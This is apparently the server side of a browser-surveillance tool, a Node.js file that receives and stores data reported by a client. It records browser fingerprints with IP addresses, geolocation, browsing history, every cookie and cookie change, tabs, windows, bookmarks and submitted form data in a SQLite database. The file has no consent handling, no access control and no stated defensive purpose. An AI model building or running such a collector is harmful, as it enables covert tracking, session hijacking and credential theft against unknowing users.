// Define constants.
var PORT =             8080;
var PORT_SSL =         8888;
var PRIVATE_KEY_PATH = 'privateKey.pem';
var CERTIFICATE_PATH = 'certificate.pem';
var DB_PATH =          'activity.sqlite';

// Import node modules.
var fs = require('fs');
var express = require('express');
var app = express();
var http = require('http').createServer(app);
var httpsOptions = {
    key: fs.readFileSync(PRIVATE_KEY_PATH),
    cert: fs.readFileSync(CERTIFICATE_PATH)
};
var https = require('https').createServer(httpsOptions, app);
var io = require('socket.io').listen(http, { log: false });
var db = require('sqlite-wrapper')(DB_PATH);

// Import event modules.
var events = {
    fingerprint: require('./events/fingerprint.js')(db),
    geoposition: require('./events/geoposition.js')(db),
    bookmark:    require('./events/bookmark.js')(db),
    history:     require('./events/history.js')(db),
    cookie:      require('./events/cookie.js')(db),
    window:      require('./events/window.js')(db),
    tab:         require('./events/tab.js')(db),
    formData:    require('./events/formData.js')(db)
};

// Start server.
http.listen(PORT);
https.listen(PORT_SSL);

///////////////////////////////////////////////////////////////////////////////
// Socket.IO handling.
///////////////////////////////////////////////////////////////////////////////

io.sockets.on('connection', function (socket) {
    // Get browser fingerprint (DB: Fingerprints).
    socket.on('addFingerprint', function (data) {
        var ipAddress = socket.handshake.address.address;
        events.fingerprint.add(data, ipAddress);
    });
    // Get current location (DB: Geopositions).
    socket.on('addGeoposition', function (data) {
        events.geoposition.add(data);
    });
    // Get URL visit(s) (DB: History).
    socket.on('addURL', function (data) {
        events.history.add(data);
    });
    // Get URL removal (DB: History).
    socket.on('removeURL', function (data) {
        events.history.remove(data);
    });
    // Get all cookies (DB: Cookies).
    socket.on('addAllCookies', function (data) {
        events.cookie.addAll(data);
    });
    // Get cookie change (DB: Cookies).
    socket.on('addCookieChange', function (data) {
        events.cookie.change(data);
    });
    // Add window (DB: Windows).
    socket.on('addWindow', function (data) {
        events.window.add(data);
    });
    // Focus window (DB: Windows).
    socket.on('focusWindow', function (data) {
        events.window.focus(data);
    });
    // Remove window (DB: Windows).
    socket.on('removeWindow', function (data) {
        events.window.remove(data);
    });
    // Add all tabs (DB: Windows, Tabs).
    socket.on('addAllTabs', function (data) {
        events.window.add(data);
        events.tab.addAll(data);
    });
    // Update tab (DB: Tabs).
    socket.on('updateTab', function (data) {
        events.tab.update(data);
    });
    // Focus tab (DB: Tabs).
    socket.on('focusTab', function (data) {
        events.tab.focus(data);
    });
    // Remove tab (DB: Tabs).
    socket.on('removeTab', function (data) {
        events.tab.remove(data);
    });
    // Add bookmark (DB: Bookmarks).
    socket.on('addBookmark', function (data) {
        events.bookmark.add(data);
    });
    // Change bookmark (DB: Bookmarks).
    socket.on('changeBookmark', function (data) {
        events.bookmark.change(data);
    });
    // Remove bookmark (DB: Bookmarks).
    socket.on('removeBookmark', function (data) {
        events.bookmark.remove(data);
    });
    // Add form data (DB: FormData).
    socket.on('addFormData', function (data) {
        events.formData.add(data);
    });
});

///////////////////////////////////////////////////////////////////////////////
// Database handling.
///////////////////////////////////////////////////////////////////////////////

// Create tables.
for (var event in events) {
    events[event].createTable();
}
